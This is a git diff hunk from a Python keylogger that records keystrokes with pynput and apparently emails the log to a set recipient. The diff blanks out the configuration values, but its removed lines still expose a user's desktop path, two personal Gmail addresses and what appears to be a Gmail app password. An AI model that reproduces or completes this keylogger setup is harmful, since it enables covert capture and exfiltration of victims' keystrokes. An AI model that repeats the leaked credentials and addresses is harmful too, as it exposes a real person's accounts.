@@ -15,15 +15,15 @@ from pynput.keyboard import Key, Listener
 
 keys_information = "key_log.txt"
 
-file_path = r"C:\Users\vikto\Desktop" # Enter the file path here
+file_path = r" " # Enter the file path here
 extend = "\\"
 
 count = 0
 keys = []
 
-email_address = "testlogger847@gmail.com" #Enter your EmailAddress here
-password = "wwjb hmbb yacy vwxz" #Enter your app password here
-toaddr = "viktor.kjellander12@gmail.com"  #Enter recipient email here
+email_address = " " #Enter your EmailAddress here
+password = " " #Enter your app password here
+toaddr = " "  #Enter recipient email here
 
 def on_press(key):
     global keys, count
